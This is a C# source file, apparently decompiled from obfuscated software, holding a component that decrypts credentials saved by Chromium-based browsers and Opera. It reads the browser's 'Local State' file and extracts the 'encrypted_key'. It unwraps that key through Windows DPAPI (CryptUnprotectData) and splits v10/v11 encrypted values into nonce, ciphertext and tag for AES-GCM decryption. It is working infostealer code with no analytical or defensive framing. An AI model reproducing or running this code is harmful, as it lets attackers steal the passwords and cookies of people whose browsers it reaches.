using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;

internal sealed class Class87
{
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	private struct Struct9
	{
		public int int_0;

		public int int_1;

		public IntPtr intptr_0;

		public string string_0;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	private struct Struct10
	{
		public int int_0;

		public IntPtr intptr_0;
	}

	private static string string_0 = "";

	private static byte[] byte_0 = new byte[0];

	[DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern bool CryptUnprotectData(ref Struct10 struct10_0, ref string string_1, ref Struct10 struct10_1, IntPtr intptr_0, ref Struct9 struct9_0, int int_0, ref Struct10 struct10_2);

	public static byte[] smethod_0(byte[] byte_1, byte[] byte_2 = null)
	{
		Struct10 struct10_ = default(Struct10);
		Struct10 struct10_2 = default(Struct10);
		Struct10 struct10_3 = default(Struct10);
		Struct9 @struct = default(Struct9);
		@struct.int_0 = Marshal.SizeOf(typeof(Struct9));
		@struct.int_1 = 0;
		@struct.intptr_0 = IntPtr.Zero;
		@struct.string_0 = null;
		Struct9 struct9_ = @struct;
		string string_ = string.Empty;
		try
		{
			try
			{
				if (byte_1 == null)
				{
					byte_1 = new byte[0];
				}
				struct10_2.intptr_0 = Marshal.AllocHGlobal(byte_1.Length);
				struct10_2.int_0 = byte_1.Length;
				Marshal.Copy(byte_1, 0, struct10_2.intptr_0, byte_1.Length);
			}
			catch
			{
			}
			try
			{
				if (byte_2 == null)
				{
					byte_2 = new byte[0];
				}
				struct10_3.intptr_0 = Marshal.AllocHGlobal(byte_2.Length);
				struct10_3.int_0 = byte_2.Length;
				Marshal.Copy(byte_2, 0, struct10_3.intptr_0, byte_2.Length);
			}
			catch
			{
			}
			CryptUnprotectData(ref struct10_2, ref string_, ref struct10_3, IntPtr.Zero, ref struct9_, 1, ref struct10_);
			byte[] array = new byte[struct10_.int_0];
			Marshal.Copy(struct10_.intptr_0, array, 0, struct10_.int_0);
			return array;
		}
		catch
		{
		}
		finally
		{
			if (struct10_.intptr_0 != IntPtr.Zero)
			{
				Marshal.FreeHGlobal(struct10_.intptr_0);
			}
			if (struct10_2.intptr_0 != IntPtr.Zero)
			{
				Marshal.FreeHGlobal(struct10_2.intptr_0);
			}
			if (struct10_3.intptr_0 != IntPtr.Zero)
			{
				Marshal.FreeHGlobal(struct10_3.intptr_0);
			}
		}
		return new byte[0];
	}

	public static byte[] smethod_1(string string_1)
	{
		string text = string_1;
		text = ((!text.Contains("Opera")) ? (text + "\\Local State") : (text + "\\Opera Stable\\Local State"));
		byte[] array = new byte[0];
		if (!File.Exists(text))
		{
			return null;
		}
		if (text != string_0)
		{
			string_0 = text;
			foreach (Match item in new Regex("\"encrypted_key\":\"(.*?)\"", RegexOptions.Compiled).Matches(File.ReadAllText(text)))
			{
				if (item.Success)
				{
					array = Convert.FromBase64String(item.Groups[1].Value);
				}
			}
			byte[] array2 = new byte[array.Length - 5];
			Array.Copy(array, 5, array2, 0, array.Length - 5);
			try
			{
				byte_0 = smethod_0(array2);
				return byte_0;
			}
			catch
			{
				return null;
			}
		}
		return byte_0;
	}

	public static string smethod_2(string string_1)
	{
		try
		{
			byte[] bytes = Encoding.Default.GetBytes(string_1);
			return Encoding.UTF8.GetString(bytes);
		}
		catch
		{
			return string_1;
		}
	}

	public static byte[] smethod_3(byte[] byte_1, byte[] byte_2)
	{
		byte[] array = new byte[12];
		Array.Copy(byte_1, 3, array, 0, 12);
		try
		{
			byte[] array2 = new byte[byte_1.Length - 15];
			Array.Copy(byte_1, 15, array2, 0, byte_1.Length - 15);
			byte[] array3 = new byte[16];
			byte[] array4 = new byte[array2.Length - array3.Length];
			Array.Copy(array2, array2.Length - 16, array3, 0, 16);
			Array.Copy(array2, 0, array4, 0, array2.Length - array3.Length);
			return new Class83().method_0(byte_2, array, null, array4, array3);
		}
		catch (Exception value)
		{
			Console.WriteLine(value);
			return null;
		}
	}

	public static string smethod_4(string string_1, string string_2)
	{
		if (!string_2.StartsWith("v10") && !string_2.StartsWith("v11"))
		{
			return Encoding.Default.GetString(smethod_0(Encoding.Default.GetBytes(string_2)));
		}
		byte[] byte_ = smethod_1(Directory.GetParent(string_1)!.Parent!.FullName);
		return Encoding.Default.GetString(smethod_3(Encoding.Default.GetBytes(string_2), byte_));
	}

	public static string smethod_5(string string_1)
	{
		if (string_1.Contains("Opera"))
		{
			return "Opera";
		}
		string_1.Replace(Class52.string_4, "");
		return string_1.Split(new char[1] { '\\' })[1];
	}
}
